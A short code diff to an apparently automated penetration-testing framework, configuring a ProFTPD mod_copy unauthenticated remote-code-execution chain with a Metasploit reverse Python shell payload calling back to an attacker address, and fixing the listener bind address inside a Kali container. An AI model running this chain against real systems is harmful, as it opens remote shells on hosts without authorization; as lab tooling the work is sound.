@@ -106,8 +106,14 @@ def build_proftpd_modcopy_graph(target_ip: str, attacker_ip: str) -> AttackGraph
         },
         payload="cmd/unix/reverse_python",
         payload_options={
-            "LHOST": attacker_ip,
+            "LHOST": attacker_ip,          # address the TARGET dials back to
             "LPORT": 4445,
+            # The handler runs inside the Kali container, which does NOT own the
+            # host-only address the target connects to (attacker_ip). Bind the
+            # listener to all interfaces so the NAT'd/published port reaches it;
+            # LHOST is still what gets embedded in the payload. Without this MSF
+            # tries to bind attacker_ip locally and fails ("Address not available").
+            "ReverseListenerBindAddress": "0.0.0.0",
         },
         max_retries=3,
         tags=["proftpd", "modcopy", "rce", "unauth"],
